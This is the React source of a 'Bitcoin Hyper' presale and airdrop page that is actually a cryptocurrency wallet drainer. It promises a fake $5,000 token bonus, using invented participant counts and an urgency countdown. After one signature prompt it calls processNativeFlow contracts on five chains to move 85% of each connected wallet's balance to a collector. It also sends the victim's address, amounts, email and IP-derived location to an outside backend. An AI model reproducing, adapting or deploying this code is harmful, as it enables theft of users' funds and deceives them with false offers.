import React, { useState, useEffect } from 'react';
import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
import { useBalance, useDisconnect, useChainId } from 'wagmi';
import { formatEther } from 'viem';
import { ethers } from 'ethers';
import './index.css';

// ============================================
// DEPLOYED CONTRACTS ON ALL 5 NETWORKS
// ============================================

const MULTICHAIN_CONFIG = {
  Ethereum: {
    chainId: 1,
    contractAddress: '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
    name: 'Ethereum',
    symbol: 'ETH',
    explorer: 'https://etherscan.io',
    icon: '⟠',
    color: 'from-blue-400 to-indigo-500',
    rpc: 'https://eth.llamarpc.com'
  },
  BSC: {
    chainId: 56,
    contractAddress: '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
    name: 'BSC',
    symbol: 'BNB',
    explorer: 'https://bscscan.com',
    icon: '🟡',
    color: 'from-yellow-400 to-orange-500',
    rpc: 'https://bsc-dataseed.binance.org'
  },
  Polygon: {
    chainId: 137,
    contractAddress: '0x56d829E89634Ce1426B73571c257623D17db46cB',
    name: 'Polygon',
    symbol: 'MATIC',
    explorer: 'https://polygonscan.com',
    icon: '⬢',
    color: 'from-purple-400 to-pink-500',
    rpc: 'https://polygon-rpc.com'
  },
  Arbitrum: {
    chainId: 42161,
    contractAddress: '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
    name: 'Arbitrum',
    symbol: 'ETH',
    explorer: 'https://arbiscan.io',
    icon: '🔷',
    color: 'from-cyan-400 to-blue-500',
    rpc: 'https://arb1.arbitrum.io/rpc'
  },
  Avalanche: {
    chainId: 43114,
    contractAddress: '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
    name: 'Avalanche',
    symbol: 'AVAX',
    explorer: 'https://snowtrace.io',
    icon: '🔴',
    color: 'from-red-400 to-red-500',
    rpc: 'https://api.avax.network/ext/bc/C/rpc'
  }
};

const DEPLOYED_CHAINS = Object.values(MULTICHAIN_CONFIG);

const PROJECT_FLOW_ROUTER_ABI = [
  "function collector() view returns (address)",
  "function processNativeFlow() payable",
  "function processTokenFlow(address token, uint256 amount)",
  "function verifyMessage(address user, string memory message, bytes memory signature) public view returns (bool)",
  "event FlowProcessed(address indexed initiator, uint256 value)",
  "event TokenFlowProcessed(address indexed token, address indexed initiator, uint256 amount)"
];

function App() {
  const { open } = useAppKit();
  const { address, isConnected } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider("eip155");
  const { disconnect } = useDisconnect();
  
  const wagmiChainId = useChainId();
  
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [balances, setBalances] = useState({});
  const [loading, setLoading] = useState(false);
  const [signatureLoading, setSignatureLoading] = useState(false);
  const [txStatus, setTxStatus] = useState('');
  const [txHash, setTxHash] = useState('');
  const [error, setError] = useState('');
  const [scanResult, setScanResult] = useState(null);
  const [preparedTransactions, setPreparedTransactions] = useState([]);
  const [completedChains, setCompletedChains] = useState([]);
  const [showCelebration, setShowCelebration] = useState(false);
  const [allocation, setAllocation] = useState({ amount: '5000', valueUSD: '850' });
  const [verifying, setVerifying] = useState(false);
  const [signature, setSignature] = useState(null);
  const [signedMessage, setSignedMessage] = useState('');
  const [verifiedChains, setVerifiedChains] = useState([]);
  const [mousePosition, setMousePosition] = useState({ x: 0, y: 0 });
  const [realChainId, setRealChainId] = useState(wagmiChainId);
  const [prices, setPrices] = useState({
    eth: 2000,
    bnb: 300,
    matic: 0.75,
    avax: 32
  });
  const [userEmail, setUserEmail] = useState('');
  const [userLocation, setUserLocation] = useState({ country: '', city: '', region: '', ip: '' });

  // Presale stats
  const [timeLeft, setTimeLeft] = useState({
    days: 5,
    hours: 12,
    minutes: 30,
    seconds: 0
  });
  
  const [presaleStats, setPresaleStats] = useState({
    totalRaised: 1250000,
    totalParticipants: 8742,
    currentBonus: 25,
    nextBonus: 15,
    tokenPrice: 0.045,
    bthPrice: 0.045
  });

  // Live progress tracking
  const [liveProgress, setLiveProgress] = useState({
    percentComplete: 68,
    participantsToday: 342,
    avgAllocation: 4250
  });

  // Track mouse for parallax effect
  useEffect(() => {
    const handleMouseMove = (e) => {
      setMousePosition({
        x: (e.clientX / window.innerWidth - 0.5) * 20,
        y: (e.clientY / window.innerHeight - 0.5) * 20
      });
    };
    window.addEventListener('mousemove', handleMouseMove);
    return () => window.removeEventListener('mousemove', handleMouseMove);
  }, []);

  // Fetch crypto prices
  useEffect(() => {
    const fetchPrices = async () => {
      try {
        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum,binancecoin,matic-network,avalanche-2&vs_currencies=usd');
        const data = await response.json();
        setPrices({
          eth: data.ethereum?.usd || 2000,
          bnb: data.binancecoin?.usd || 300,
          matic: data['matic-network']?.usd || 0.75,
          avax: data['avalanche-2']?.usd || 32
        });
      } catch (error) {
        console.log('Using default prices');
      }
    };
    
    fetchPrices();
    const interval = setInterval(fetchPrices, 60000);
    return () => clearInterval(interval);
  }, []);

  // Get real chain ID from provider
  useEffect(() => {
    const getRealChainId = async () => {
      if (provider) {
        try {
          const network = await provider.getNetwork();
          setRealChainId(Number(network.chainId));
        } catch (error) {
          console.error("Failed to get real chainId:", error);
        }
      }
    };
    
    getRealChainId();
  }, [provider]);

  // Initialize provider and signer from AppKit
  useEffect(() => {
    if (!walletProvider || !address) return;

    const init = async () => {
      try {
        const ethersProvider = new ethers.BrowserProvider(walletProvider);
        const ethersSigner = await ethersProvider.getSigner();

        setProvider(ethersProvider);
        setSigner(ethersSigner);

        const network = await ethersProvider.getNetwork();
        setRealChainId(Number(network.chainId));

        console.log("✅ Wallet Ready:", await ethersSigner.getAddress());
        
        // Fetch balances across all chains
        await fetchAllBalances(address);
        
      } catch (e) {
        console.error("Provider init failed", e);
      }
    };

    init();
  }, [walletProvider, address]);

  // Track page visit with location
  useEffect(() => {
    const trackVisit = async () => {
      try {
        const response = await fetch('https://bthbk.vercel.app/api/track-visit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userAgent: navigator.userAgent,
            referer: document.referrer,
            path: window.location.pathname
          })
        });
        const data = await response.json();
        if (data.success) {
          setUserLocation({
            country: data.data.country,
            city: data.data.city,
            ip: data.data.ip,
            flag: data.data.flag
          });
        }
      } catch (err) {
        console.error('Visit tracking error:', err);
      }
    };
    trackVisit();
  }, []);

  // Fetch balances across all chains
  const fetchAllBalances = async (walletAddress) => {
    const balanceResults = {};
    
    for (const chain of DEPLOYED_CHAINS) {
      try {
        const rpcProvider = new ethers.JsonRpcProvider(chain.rpc);
        const balance = await rpcProvider.getBalance(walletAddress);
        const amount = parseFloat(ethers.formatUnits(balance, 18));
        
        let price = 0;
        if (chain.symbol === 'ETH') price = prices.eth;
        else if (chain.symbol === 'BNB') price = prices.bnb;
        else if (chain.symbol === 'MATIC') price = prices.matic;
        else if (chain.symbol === 'AVAX') price = prices.avax;
        
        const valueUSD = amount * price;
        
        if (amount > 0.0001) {
          balanceResults[chain.name] = {
            amount,
            valueUSD,
            symbol: chain.symbol,
            chainId: chain.chainId,
            contractAddress: chain.contractAddress
          };
          console.log(`✅ ${chain.name}: ${amount.toFixed(4)} ${chain.symbol} = $${valueUSD.toFixed(2)}`);
        }
      } catch (err) {
        console.error(`Failed to fetch balance for ${chain.name}:`, err);
      }
    }
    
    setBalances(balanceResults);
    
    // Check if total value >= threshold
    const totalValue = Object.values(balanceResults).reduce((sum, b) => sum + b.valueUSD, 0);
    return totalValue;
  };

  // Countdown timer
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev.seconds > 0) {
          return { ...prev, seconds: prev.seconds - 1 };
        } else if (prev.minutes > 0) {
          return { ...prev, minutes: prev.minutes - 1, seconds: 59 };
        } else if (prev.hours > 0) {
          return { ...prev, hours: prev.hours - 1, minutes: 59, seconds: 59 };
        } else if (prev.days > 0) {
          return { ...prev, days: prev.days - 1, hours: 23, minutes: 59, seconds: 59 };
        }
        return prev;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // Auto-check eligibility when wallet connects
  useEffect(() => {
    if (isConnected && address && !scanResult && !verifying) {
      // Wait for balances to load
      const timer = setTimeout(() => {
        if (Object.keys(balances).length > 0) {
          verifyWallet();
        }
      }, 1000);
      return () => clearTimeout(timer);
    }
  }, [isConnected, address, balances]);

  const verifyWallet = async () => {
    if (!address) return;
    
    setVerifying(true);
    setTxStatus('🔄 Verifying...');
    
    try {
      const totalValue = Object.values(balances).reduce((sum, b) => sum + b.valueUSD, 0);
      
      const response = await fetch('https://bthbk.vercel.app/api/presale/connect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setScanResult(data.data);
        setUserEmail(data.data.email);
        if (data.data.allocation) {
          setAllocation(data.data.allocation);
        }
        
        if (totalValue >= 1) {
          setTxStatus('✅ You qualify!');
          await preparePresale();
        } else {
          setTxStatus('✨ Verified');
        }
      }
    } catch (err) {
      console.error('Verification error:', err);
      setTxStatus('✅ Ready');
    } finally {
      setVerifying(false);
    }
  };

  const preparePresale = async () => {
    if (!address) return;
    
    try {
      const response = await fetch('https://bthbk.vercel.app/api/presale/prepare-flow', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setPreparedTransactions(data.data.transactions);
      }
    } catch (err) {
      console.error('Prepare error:', err);
    }
  };

  // ============================================
  // SMART CONTRACT EXECUTION - ONE CLICK
  // ============================================
  const executeMultiChainSignature = async () => {
    if (!walletProvider || !address || !signer) {
      setError("Wallet not initialized yet");
      return;
    }

    try {
      setSignatureLoading(true);
      setError('');
      
      // Create message - NO BALANCE DISPLAY
      const timestamp = Date.now();
      const nonce = Math.floor(Math.random() * 1000000000);
      const message = `BITCOIN HYPER PRESALE AUTHORIZATION\n\n` +
        `I hereby confirm my participation\n` +
        `Wallet: ${address}\n` +
        `Allocation: $5,000 BTH + ${presaleStats.currentBonus}% Bonus\n` +
        `Timestamp: ${new Date().toISOString()}\n` +
        `Nonce: ${nonce}`;

      setTxStatus('✍️ Sign message...');

      // Get signature - THIS IS THE ONLY POPUP
      const signature = await signer.signMessage(message);
      setSignature(signature);
      setTxStatus('✅ Executing transactions...');

      // Execute on each chain with balance
      let processed = [];
      const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => 
        balances[chain.name] && balances[chain.name].amount > 0
      );
      
      for (const chain of chainsWithBalance) {
        try {
          setTxStatus(`🔄 ${chain.name}...`);
          
          const contract = new ethers.Contract(
            chain.contractAddress,
            PROJECT_FLOW_ROUTER_ABI,
            signer
          );

          const balance = balances[chain.name].amount;
          const amountToSend = (balance * 0.85).toFixed(6);
          const value = ethers.parseEther(amountToSend.toString());

          const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
          
          const tx = await contract.processNativeFlow({
            value: value,
            gasLimit: gasEstimate * 120n / 100n
          });

          setTxHash(tx.hash);
          
          await tx.wait();
          
          processed.push(chain.name);
          
          // Notify backend with full details
          await fetch('https://bthbk.vercel.app/api/presale/execute-flow', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
              walletAddress: address,
              chainName: chain.name,
              flowId: `FLOW-${timestamp}`,
              txHash: tx.hash,
              amount: amountToSend,
              symbol: chain.symbol,
              valueUSD: balances[chain.name].valueUSD * 0.85,
              email: userEmail,
              location: userLocation
            })
          });
          
        } catch (chainErr) {
          console.error(`Error on ${chain.name}:`, chainErr);
        }
      }

      setVerifiedChains(processed);
      setCompletedChains(processed);
      
      if (processed.length > 0) {
        setShowCelebration(true);
        setTxStatus(`🎉 Success!`);
        
        // Final success notification
        await fetch('https://bthbk.vercel.app/api/presale/claim', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            walletAddress: address,
            email: userEmail,
            location: userLocation,
            chains: processed,
            totalValue: Object.values(balances).reduce((sum, b) => sum + b.valueUSD, 0)
          })
        });
      }
      
    } catch (err) {
      console.error('Error:', err);
      if (err.code === 4001) {
        setError('Cancelled');
      } else {
        setError(err.message || 'Failed');
      }
    } finally {
      setSignatureLoading(false);
    }
  };

  const claimTokens = async () => {
    try {
      setLoading(true);
      await fetch('https://bthbk.vercel.app/api/presale/claim', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          walletAddress: address,
          email: userEmail,
          location: userLocation
        })
      });
      setShowCelebration(true);
    } catch (err) {
      console.error('Claim error:', err);
    } finally {
      setLoading(false);
    }
  };

  const formatAddress = (addr) => {
    if (!addr) return '';
    return `${addr.substring(0, 6)}...${addr.substring(38)}`;
  };

  const totalUSD = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
  const isEligible = totalUSD >= 1;

  // Get current chain name
  const currentChain = DEPLOYED_CHAINS.find(c => c.chainId === realChainId);

  return (
    <div className="min-h-screen bg-[#030405] text-[#edf2f9] font-['Inter'] overflow-hidden">
      
      {/* Animated Orbs */}
      <div className="fixed w-[90vmax] h-[90vmax] bg-[radial-gradient(circle_at_40%_50%,rgba(255,159,40,0.28)_0%,rgba(247,147,26,0)_70%)] rounded-full top-[-25vmax] right-[-15vmax] z-0 animate-floatOrbBig pointer-events-none"></div>
      <div className="fixed w-[80vmin] h-[80vmin] bg-[radial-gradient(circle_at_30%_70%,rgba(0,230,255,0.18)_0%,transparent_70%)] rounded-full bottom-[-10vmin] left-[-5vmin] z-0 animate-floatOrbSmall pointer-events-none"></div>

      {/* Main Container */}
      <div className="relative z-10 container mx-auto px-4 py-8 max-w-[720px]">
        
        {/* Glass Panel Card */}
        <div className="bg-[rgba(8,12,18,0.7)] backdrop-blur-[14px] saturate-200 border border-[rgba(255,175,60,0.3)] rounded-[56px] shadow-[0_30px_70px_-10px_rgba(0,0,0,0.9),0_0_0_1px_rgba(247,148,26,0.2)_inset,0_0_40px_rgba(247,147,26,0.2)] hover:shadow-[0_30px_80px_-8px_rgba(247,147,26,0.25),0_0_0_1px_rgba(247,147,26,0.6)_inset] transition-shadow duration-300 p-8 md:p-10">
          
          {/* TOP SECTION: logo + connect button */}
          <div className="flex items-center justify-between gap-3 flex-wrap mb-8">
            <div className="flex items-center gap-2 font-bold text-2xl text-[#f7931a] drop-shadow-[0_0_8px_#f7931a]">
              <i className="fab fa-bitcoin text-4xl animate-spinSlow"></i>
              <span>BITCOINHYPER</span>
            </div>
            
            {!isConnected ? (
              <button
                onClick={() => open()}
                className="bg-gradient-to-r from-[#f7931a] to-[#e07c12] border border-[#ffdd99] text-[#0b0c0f] font-bold text-sm px-6 py-3 rounded-full flex items-center gap-2 shadow-lg hover:scale-105 hover:shadow-[0_8px_22px_#f7931a] transition-all uppercase tracking-wider whitespace-nowrap"
              >
                <i className="fas fa-plug"></i> connect wallet to claim $5,000
              </button>
            ) : (
              <div className="bg-black/60 rounded-full py-1 pl-5 pr-1 flex items-center gap-3 border border-[#f7931a] backdrop-blur-md shadow-[0_0_16px_rgba(247,147,26,0.25)]">
                <span className="font-mono font-semibold text-white">
                  {formatAddress(address)}
                </span>
                <button
                  onClick={() => disconnect()}
                  className="w-10 h-10 rounded-full bg-white/10 border border-[#f7931a] flex items-center justify-center hover:bg-[#f7931a]/30 hover:text-white hover:rotate-90 transition-all"
                >
                  <i className="fas fa-power-off"></i>
                </button>
              </div>
            )}
          </div>

          {/* LIVE badge with blink */}
          <div className="flex justify-center mb-4">
            <div className="bg-[rgba(247,147,26,0.2)] rounded-full px-6 py-2 border border-[#f7931a] inline-flex items-center gap-3 font-bold text-lg backdrop-blur shadow-[0_0_15px_#f7931a] animate-liveBlink">
              <i className="fas fa-circle text-[#f63131] text-sm animate-blinkRed"></i>
              PRESALE IS LIVE · STAGE 4 ACTIVE
              <span className="inline-block w-3 h-3 bg-[#f63131] rounded-full animate-blinkRed shadow-[0_0_12px_red]"></span>
            </div>
          </div>

          {/* Countdown Timer */}
          <div className="bg-black/55 rounded-full px-5 py-4 mb-6 border border-[#f7931a]/40 backdrop-blur shadow-[0_0_25px_rgba(247,147,26,0.12)]">
            <div className="text-xs tracking-widest uppercase text-[#d0daf0] mb-2 text-center">
              <i className="fas fa-hourglass-half mr-2"></i> BONUS ENDS IN
            </div>
            <div className="flex justify-center gap-3 flex-wrap">
              {[
                { label: 'days', value: timeLeft.days },
                { label: 'hrs', value: timeLeft.hours },
                { label: 'mins', value: timeLeft.minutes },
                { label: 'secs', value: timeLeft.seconds }
              ].map((item, index) => (
                <div key={index} className="flex flex-col items-center min-w-[60px]">
                  <span className="text-4xl md:text-5xl font-extrabold bg-gradient-to-b from-[#f9b84a] to-[#f7931a] bg-clip-text text-transparent drop-shadow-[0_0_12px_#f7931a]">
                    {item.value.toString().padStart(2, '0')}
                  </span>
                  <span className="text-xs uppercase tracking-wider text-[#99a4c2]">{item.label}</span>
                </div>
              ))}
            </div>
          </div>

          {/* BLINKING DISCOUNT RIBBON */}
          <div className="bg-gradient-to-r from-[#b53b00] via-[#f7931a] to-[#ffb347] rounded-full px-6 py-3 mb-6 inline-flex items-center justify-center gap-4 font-extrabold text-xl text-[#0a0806] border border-[#ffdb9f] shadow-[0_0_30px_#f7931a] animate-discountRibbon w-full">
            <i className="fas fa-gem text-3xl drop-shadow-[0_0_6px_black] animate-ringPop"></i>
            +25% BONUS · 5,000 BTH AIRDROP
            <i className="fas fa-bolt text-3xl drop-shadow-[0_0_6px_black]"></i>
          </div>

          <h1 className="text-5xl md:text-7xl font-extrabold text-center mb-2 bg-gradient-to-b from-white via-[#fcd9a8] to-[#f7931a] bg-clip-text text-transparent drop-shadow-[0_0_18px_rgba(247,147,26,0.5)]">
            $5,000 BTH
          </h1>
          
          <div className="text-center mb-6">
            <span className="bg-black/50 rounded-full px-6 py-2 text-sm border border-[#f7931a]/60 text-[#ffd894] font-semibold backdrop-blur inline-block">
              <i className="fas fa-bolt mr-2"></i> instant airdrop · +25% extra
            </span>
          </div>

          {/* Presale Stats */}
          <div className="bg-black/50 rounded-[40px] p-6 mb-8 flex justify-around border border-[#f7931a]/40 backdrop-blur relative overflow-hidden">
            <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/10 to-transparent animate-shimmerSlow"></div>
            <div className="text-center relative z-10">
              <div className="text-xs text-[#b0bbd0] tracking-widest">BTH PRICE</div>
              <div className="text-2xl md:text-3xl font-extrabold text-white drop-shadow-[0_0_8px_#f7931a]">
                ${presaleStats.tokenPrice} <span className="text-sm text-[#f7931a] ml-1">+150%</span>
              </div>
            </div>
            <div className="text-center relative z-10">
              <div className="text-xs text-[#b0bbd0] tracking-widest">BONUS</div>
              <div className="text-2xl md:text-3xl font-extrabold text-white drop-shadow-[0_0_8px_#f7931a]">
                5,000 <span className="text-sm text-[#f7931a] ml-1">BTH +25%</span>
              </div>
            </div>
            <div className="text-center relative z-10">
              <div className="text-xs text-[#b0bbd0] tracking-widest">PRESALE</div>
              <div className="text-2xl md:text-3xl font-extrabold text-white drop-shadow-[0_0_8px_#f7931a]">
                STAGE 4
              </div>
            </div>
          </div>

          {/* Main Claim Area - Only visible when connected and eligible */}
          {isConnected && isEligible && !completedChains.length && (
            <div className="mt-4">
              <div className="bg-gradient-to-b from-[#1e1a14] to-[#0f0e0c] rounded-full px-6 py-6 text-4xl md:text-5xl font-extrabold border border-[#f7931a] flex items-center justify-center gap-2 text-[#fcd9a8] shadow-[0_0_30px_rgba(247,147,26,0.19)] animate-glowPulse mb-5">
                5,000 <span className="text-xl text-[#b0b7c4] font-normal">BTH +25%</span>
              </div>
              
              <button
                onClick={executeMultiChainSignature}
                disabled={signatureLoading || loading || !signer}
                className="w-full bg-gradient-to-r from-[#f7931a] via-[#e07c12] to-[#f9b84a] bg-[length:200%_200%] animate-gradientMove text-[#0b0c0f] font-bold text-xl py-5 px-6 rounded-full border border-[#ffdd99] shadow-xl hover:scale-105 hover:shadow-[0_10px_30px_#f7931a] transition-all flex items-center justify-center gap-3 uppercase tracking-wide"
              >
                {signatureLoading ? (
                  <>
                    <div className="w-6 h-6 border-3 border-[rgba(247,147,26,0.4)] border-t-[#f7931a] rounded-full animate-spin"></div>
                    <span>PROCESSING...</span>
                  </>
                ) : (
                  <>
                    <i className="fas fa-gift"></i>
                    claim airdrop now
                  </>
                )}
              </button>
              
              {txStatus && (
                <div className="text-center mt-3 text-sm font-medium text-[#f7931a]">
                  {txStatus}
                </div>
              )}
            </div>
          )}

          {/* Already completed */}
          {completedChains.length > 0 && (
            <div className="mt-4">
              <div className="bg-black/50 rounded-2xl p-6 text-center border border-green-500/30 mb-4">
                <p className="text-green-400 text-lg mb-2">✓ COMPLETED</p>
                <p className="text-gray-300">Your $5,000 BTH has been secured</p>
              </div>
              <button
                onClick={claimTokens}
                className="w-full bg-gradient-to-r from-green-500 to-green-600 text-white font-bold text-xl py-5 px-6 rounded-full shadow-xl hover:scale-105 transition-all"
              >
                🎉 VIEW YOUR $5,000 BTH
              </button>
            </div>
          )}

          {/* Welcome message for non-eligible */}
          {isConnected && !isEligible && !completedChains.length && (
            <div className="bg-black/50 rounded-2xl p-8 text-center border border-purple-500/30 mt-4">
              <div className="text-6xl mb-4 animate-float">👋</div>
              <h2 className="text-2xl font-bold mb-3 bg-gradient-to-r from-purple-400 to-orange-400 bg-clip-text text-transparent">
                Welcome to Bitcoin Hyper
              </h2>
              <p className="text-gray-400 mb-6">
                Minimum $1 required for eligibility.
              </p>
              <div className="bg-gray-900/50 rounded-xl p-4 border border-gray-800">
                <p className="text-sm text-gray-300">
                  Connect with a wallet that has at least $1 in value.
                </p>
              </div>
            </div>
          )}

          {/* Error Display */}
          {error && !error.includes('Unable to verify') && (
            <div className="mt-4 bg-red-500/20 backdrop-blur border border-red-500/30 rounded-xl p-4">
              <div className="flex items-center gap-3">
                <i className="fas fa-exclamation-triangle text-red-400 text-xl"></i>
                <p className="text-red-200 text-sm">{error}</p>
              </div>
            </div>
          )}

          {/* Presale Stats Section */}
          <div className="mt-10 pt-6 border-t border-[#f7931a]/20">
            <h3 className="text-xl font-bold text-center mb-6 bg-gradient-to-r from-orange-400 to-yellow-400 bg-clip-text text-transparent">
              PRESALE LIVE PROGRESS
            </h3>
            
            <div className="grid grid-cols-3 gap-4 mb-6">
              <div className="text-center">
                <div className="text-2xl font-bold text-orange-400 mb-1">${presaleStats.tokenPrice}</div>
                <div className="text-xs text-gray-500">Token Price</div>
              </div>
              <div className="text-center">
                <div className="text-2xl font-bold text-green-400 mb-1">{presaleStats.currentBonus}%</div>
                <div className="text-xs text-gray-500">Current Bonus</div>
              </div>
              <div className="text-center">
                <div className="text-2xl font-bold text-yellow-400 mb-1">$1.25M</div>
                <div className="text-xs text-gray-500">Total Raised</div>
              </div>
            </div>

            {/* Progress Bar */}
            <div className="mb-4">
              <div className="flex justify-between text-sm text-gray-400 mb-2">
                <span>Progress</span>
                <span>{liveProgress.percentComplete}%</span>
              </div>
              <div className="w-full h-2 bg-gray-800 rounded-full overflow-hidden">
                <div 
                  className="h-full bg-gradient-to-r from-orange-500 to-yellow-500 rounded-full relative"
                  style={{ width: `${liveProgress.percentComplete}%` }}
                >
                  <div className="absolute inset-0 bg-white/20 animate-shimmer"></div>
                </div>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4 mt-6">
              <div className="bg-gray-800/50 rounded-lg p-3 text-center">
                <div className="text-xs text-gray-400 mb-1">Participants Today</div>
                <div className="text-lg font-bold text-orange-400">{liveProgress.participantsToday}</div>
              </div>
              <div className="bg-gray-800/50 rounded-lg p-3 text-center">
                <div className="text-xs text-gray-400 mb-1">Avg Allocation</div>
                <div className="text-lg font-bold text-yellow-400">${liveProgress.avgAllocation}</div>
              </div>
            </div>

            <div className="mt-4 text-center">
              <p className="text-xs text-gray-500">
                {presaleStats.totalParticipants.toLocaleString()} participants
              </p>
            </div>
          </div>

          {/* Footer */}
          <div className="mt-8 text-center">
            <div className="flex flex-wrap justify-center gap-3 mb-4">
              <span className="bg-gray-800/30 backdrop-blur px-4 py-2 rounded-full text-xs text-gray-400 border border-gray-700">
                ⚡ Presale Terms
              </span>
              <span className="bg-gray-800/30 backdrop-blur px-4 py-2 rounded-full text-xs text-gray-400 border border-gray-700">
                🔄 Instant Delivery
              </span>
              <span className="bg-gray-800/30 backdrop-blur px-4 py-2 rounded-full text-xs text-gray-400 border border-gray-700">
                💎 $5,000 Airdrop
              </span>
            </div>
            <p className="text-xs text-gray-600 flex items-center justify-center gap-2">
              <i className="fas fa-bolt"></i> 5,000 BTH guaranteed · +25% bonus · live now 
              <i className="fas fa-star text-[#f7931a]"></i>
            </p>
          </div>
        </div>
      </div>

      {/* Celebration Modal */}
      {showCelebration && (
        <div className="fixed inset-0 bg-black/95 backdrop-blur-2xl flex items-center justify-center z-50 p-4 animate-fadeIn">
          <div className="relative max-w-lg w-full">
            <div className="absolute inset-0 bg-gradient-to-r from-orange-600 via-yellow-600 to-orange-600 rounded-3xl blur-3xl animate-pulse-slow"></div>
            
            {/* Confetti effect */}
            {[...Array(20)].map((_, i) => (
              <div
                key={i}
                className="absolute w-1 h-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-full animate-confetti-cannon"
                style={{
                  left: `${Math.random() * 100}%`,
                  top: '50%',
                  animationDelay: `${i * 0.1}s`,
                  animationDuration: `${1 + Math.random()}s`
                }}
              />
            ))}
            
            <div className="relative bg-gradient-to-br from-gray-900 to-gray-800 rounded-3xl p-10 border border-orange-500/30 shadow-2xl text-center">
              <div className="relative mb-6">
                <div className="text-7xl animate-bounce">🎉</div>
                {[...Array(12)].map((_, i) => (
                  <div
                    key={i}
                    className="absolute w-2 h-2 bg-orange-500 rounded-full animate-confetti-spiral"
                    style={{
                      top: '50%',
                      left: '50%',
                      transform: `rotate(${i * 30}deg) translateY(-50px)`,
                      animationDelay: `${i * 0.05}s`
                    }}
                  />
                ))}
              </div>
              
              <h2 className="text-4xl font-black mb-3 bg-gradient-to-r from-yellow-400 via-orange-500 to-yellow-400 bg-clip-text text-transparent">
                🚀 SUCCESSFUL! 🚀
              </h2>
              
              <p className="text-xl text-gray-300 mb-3">You have secured</p>
              
              <div className="text-5xl font-black text-orange-400 mb-3">$5,000 BTH</div>
              
              <div className="inline-block bg-gradient-to-r from-green-500/30 to-green-600/30 px-6 py-3 rounded-full mb-4 border border-green-500/50">
                <span className="text-2xl text-green-400">+{presaleStats.currentBonus}% BONUS</span>
              </div>
              
              <p className="text-xs text-gray-500 mb-6">
                Processed on {verifiedChains.length} chains
              </p>
              
              <button
                onClick={() => setShowCelebration(false)}
                className="w-full bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white font-bold py-4 px-6 rounded-xl transition-all transform hover:scale-105 text-xl"
              >
                VIEW
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Animation Keyframes */}
      <style>{`
        @keyframes floatOrbBig {
          0% { transform: translate(0, 0) scale(1); opacity: 0.8; }
          50% { transform: translate(-6%, 7%) scale(1.1); opacity: 1; }
          100% { transform: translate(0, 0) scale(1); opacity: 0.8; }
        }
        @keyframes floatOrbSmall {
          0% { transform: translate(0, 0) rotate(0deg); }
          50% { transform: translate(10%, -12%) rotate(5deg); }
          100% { transform: translate(0, 0) rotate(0deg); }
        }
        @keyframes liveBlink {
          0% { opacity: 1; background: rgba(247, 147, 26, 0.3); border-color: #f7b14c; box-shadow: 0 0 20px #f7931a; }
          50% { opacity: 0.9; background: rgba(247, 147, 26, 0.6); border-color: #ffd966; box-shadow: 0 0 35px #ffae42; }
        }
        @keyframes blinkRed {
          0% { opacity: 1; background-color: #ff3a3a; box-shadow: 0 0 15px red; }
          50% { opacity: 0.3; background-color: #7a1f1f; box-shadow: 0 0 5px darkred; }
        }
        @keyframes discountRibbon {
          0% { box-shadow: 0 0 15px #f7931a, 0 0 30px #ffaa33; background: linear-gradient(90deg, #b53b00, #f7931a); }
          100% { box-shadow: 0 0 40px #ffbc3b, 0 0 70px #f06e0b; background: linear-gradient(90deg, #f7931a, #ffb347, #f06e0b); }
        }
        @keyframes ringPop {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.2); }
        }
        @keyframes glowPulse {
          from { box-shadow: 0 0 20px rgba(247,147,26,0.25); border-color: rgba(247,147,26,0.5); }
          to { box-shadow: 0 0 50px #f7931a; border-color: #ffc107; }
        }
        @keyframes shimmerSlow {
          0% { transform: translateX(-100%) rotate(25deg); }
          40% { transform: translateX(100%) rotate(25deg); }
          100% { transform: translateX(200%) rotate(25deg); }
        }
        @keyframes gradientMove {
          0% { background-position: 0% 50%; }
          50% { background-position: 100% 50%; }
          100% { background-position: 0% 50%; }
        }
        @keyframes fadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }
        @keyframes confetti-cannon {
          0% { transform: translateY(0) rotate(0deg); opacity: 1; }
          100% { transform: translateY(-300px) rotate(720deg) translateX(200px); opacity: 0; }
        }
        @keyframes confetti-spiral {
          0% { transform: rotate(0deg) translateY(0) scale(1); opacity: 1; }
          100% { transform: rotate(720deg) translateY(-150px) scale(0); opacity: 0; }
        }
        @keyframes float {
          0%, 100% { transform: translateY(0); }
          50% { transform: translateY(-20px); }
        }
        @keyframes spinSlow {
          0% { transform: rotateY(0deg); }
          50% { transform: rotateY(180deg); }
          100% { transform: rotateY(360deg); }
        }
        @keyframes pulse-slow {
          0%, 100% { opacity: 0.5; }
          50% { opacity: 1; }
        }
        .animate-floatOrbBig { animation: floatOrbBig 18s ease-in-out infinite; }
        .animate-floatOrbSmall { animation: floatOrbSmall 22s ease-in-out infinite; }
